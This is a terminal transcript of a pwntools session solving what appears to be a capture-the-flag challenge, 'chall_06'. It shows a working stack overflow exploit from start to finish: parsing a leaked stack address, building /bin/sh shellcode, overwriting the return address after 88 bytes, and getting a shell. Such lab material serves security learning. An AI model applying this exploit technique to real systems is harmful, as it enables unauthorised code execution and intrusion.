──(kali㉿kali)-[~/pwns/chall_06]
└─$ python  ------------------------------------------------------------------->  Command   
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> p=process('./chall_06')  ------------------------------------------------------------------->  Command   
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'process' is not defined
>>> from pwn import *  ------------------------------------------------------------------->  Command   
>>> p=process('./chall_06')  ------------------------------------------------------------------->  Command   
[x] Starting local process './chall_06'
[+] Starting local process './chall_06': pid 121331
>>> resp = p.read()  ------------------------------------------------------------------->  Command   
>>> resp ------------------------------------------------------------------->  Command   
b"I drink milk even though i'm lactose intolerant: 0x7ffd91ec7d90\n"
>>> import re  ------------------------------------------------------------------->  Command   
>>> leak = re.findall(b'([0-9a-f]{6,16})', resp)  ------------------------------------------------------------------->  Command   
>>> leak  ------------------------------------------------------------------->  Command   
[b'7ffd91ec7d90']
>>> leak=leak[0]  ------------------------------------------------------------------->  Command   
>>> leak  ------------------------------------------------------------------->  Command   
b'7ffd91ec7d90'
>>> int(leak,16)  ------------------------------------------------------------------->  Command   
140727051648400
>>> leak=_  ------------------------------------------------------------------->  Command   
>>> print(hex(leak))  ------------------------------------------------------------------->  Command   
0x7ffd91ec7d90
>>> context.arch = "amd64"  ------------------------------------------------------------------->  Command   
>>> shl = asm(shellcraft.sh())  ------------------------------------------------------------------->  Command   
>>> shl   ------------------------------------------------------------------->  Command   
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>> p.sendline(shl)  ------------------------------------------------------------------->  Command   
>>> p.sendline(b"A"*88 + p64(leak))  ------------------------------------------------------------------->  Command   
>>> p.interactive()  ------------------------------------------------------------------->  Command   
[*] Switching to interactive mode
ls
chall_06  core  e.py
whoami
kali

                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                   